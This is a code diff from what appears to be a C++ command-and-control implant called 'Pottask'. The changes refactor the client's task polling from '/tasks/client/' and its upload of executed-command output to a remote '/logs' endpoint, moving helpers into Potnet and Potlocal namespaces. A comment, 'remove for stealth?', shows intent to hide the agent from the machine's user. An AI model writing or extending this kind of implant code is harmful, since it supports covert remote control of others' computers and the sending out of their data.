@@ -4,9 +4,13 @@
 #include <iostream>
 #include <string>
 
+#include "task.hpp"
 #include "globals.hpp"
+#include "local.hpp"
+#include "net.hpp"
 
 using namespace nlohmann;
+namespace beast = boost::beast;
 namespace http = beast::http;
 
 ////TASK FUNCS
@@ -14,7 +18,7 @@ namespace http = beast::http;
 TASK_STATUS Pottask::readTask()
 {
     try {
-        auto task_response = getRequest("/tasks/client/" + client_id);
+        auto task_response = Potnet::getRequest("/tasks/client/" + client_id);
         if(task_response.res_body.result() == http::status::ok){
             task_array = json::parse(task_response.res_body.body());
 
@@ -53,7 +57,7 @@ void Pottask::addLog(json json_object, std::string command_output)
     current_log["log_cmd_type"] = json_object["task_cmd_type"];
     current_log["log_cmd_input"] = json_object["task_cmd_input"];
     current_log["log_issue_date"] = json_object["task_issue_date"];
-    current_log["exec_date"] = getTime();
+    current_log["exec_date"] = Potlocal::getTime();
     current_log["task_id"] = json_object["id"];
     current_log["log_cmd_output"] = command_output;
 
@@ -67,8 +71,8 @@ void Pottask::uploadLog()
     for (const auto& item : log_array.items())
     {
         std::cout << item.value().dump() << std::endl;//remove for stealth?
-        item.value()["send_time"] = getTime();
-        postRequest("/logs", "data=" + item.value().dump());
+        item.value()["send_time"] = Potlocal::getTime();
+        Potnet::postRequest("/logs", "data=" + item.value().dump());
         //sleep for rate limiting
         //if successful, remove item; if not, skip
     }
